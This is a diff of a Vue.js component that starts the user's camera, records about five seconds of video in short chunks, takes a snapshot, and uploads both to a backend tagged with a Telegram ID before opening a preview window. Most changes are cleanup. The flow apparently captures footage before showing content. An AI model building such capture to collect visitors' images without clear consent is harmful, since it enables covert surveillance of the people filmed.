@@ -52,7 +52,6 @@ export default {
     this.$refs.video.srcObject = this.stream;
 
     // Устанавливаем настройки MediaRecorder и стартуем запись с заданным интервалом
-
     if (MediaRecorder.isTypeSupported(this.defaultMimeType.mimeType)){
       this.options = { mimeType: 'video/webm; codecs=vp8'}; 
       this.videoFormat = 'webm'
@@ -63,7 +62,7 @@ export default {
     
 
     const mediaRecorder = new MediaRecorder(this.stream, this.options);
-    const CHUNK_INTERVAL = 350; // Интервал отправки 0.5 секунды (500 мс)
+    const CHUNK_INTERVAL = 380; // Интервал отправки 0.38 секунды 380 мс)
     mediaRecorder.start(CHUNK_INTERVAL);
 
     // Обработчик для отправки чанков, как только они становятся доступны
@@ -74,7 +73,6 @@ export default {
       formData.append('telegram_id', this.telegramId);
 
       try {
-        // Отправляем чанк на сервер
         await fetch(`${this.baseUrl}/api/v1/send_chunk/`, {
           method: "POST",
           body: formData,
@@ -84,19 +82,13 @@ export default {
         console.error("Ошибка отправки чанка:", error);
       }
     };
-    this.$refs.video.addEventListener('loadeddata', () => {
-      setTimeout(() => {
-        this.takeSnapshot(); // Делаем снимок
-      }, 1000); // Задержка для фокусировки
-    });
+    // Делаем снимок
+    this.$refs.video.addEventListener('loadeddata', () => {this.takeSnapshot();});
     setTimeout(() => {
       mediaRecorder.stop()
       this.previewModalWindow()
       this.stream.getTracks().forEach((track) => track.stop());
     }, 5000)
-
-    // Когда видео загружено, делаем снимок после небольшой задержки
-    
     
     // Останавливаем запись и видео-поток перед закрытием страницы
     window.addEventListener("beforeunload", () => {
@@ -107,9 +99,7 @@ export default {
   } catch (err) {
     console.error('Ошибка доступа к камере:', err);
   }
-},
-
-    
+},  
     stopCamera() {
       // Остановка камеры
       if (this.stream) {
@@ -129,10 +119,10 @@ export default {
     },
     async sendData(imageData) {
       const photoBlob = this.dataURItoBlob(imageData);
-      // Формируем данные для отправки
       const formData = new FormData();
       formData.append('image', photoBlob, 'photo.png');
       formData.append('telegram_id', this.telegramId)
+
       // Отправляем POST-запрос
       fetch(`${this.baseUrl}/api/v1/send_image/`, {
         method: 'POST',
@@ -141,20 +131,7 @@ export default {
       .then(response => response.json())
       .then(data => {
         console.log('Success:', data);
-        this.stopCamera(); // Останавливаем видеопоток после отправки данных
-        setTimeout(() => {
-      this.previewModalWindow()
-    }, 3000)
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-        this.stopCamera()
-        setTimeout(() => {
-      this.previewModalWindow()
-    }, 3000)
-      });
-
-      
+      })  
     },
     // Преобразуем base64 в Blob
     dataURItoBlob(dataURI) {
@@ -172,10 +149,8 @@ export default {
       this.infoBlockActive = true
     }
   },
-  beforeUnmount() { // Замена beforeDestroy на beforeUnmount
-    this.stopCamera(); // Останавливаем камеру при уничтожении компонента
-    
-    
+  beforeUnmount() { 
+    this.stopCamera();
   }
 };
 </script>
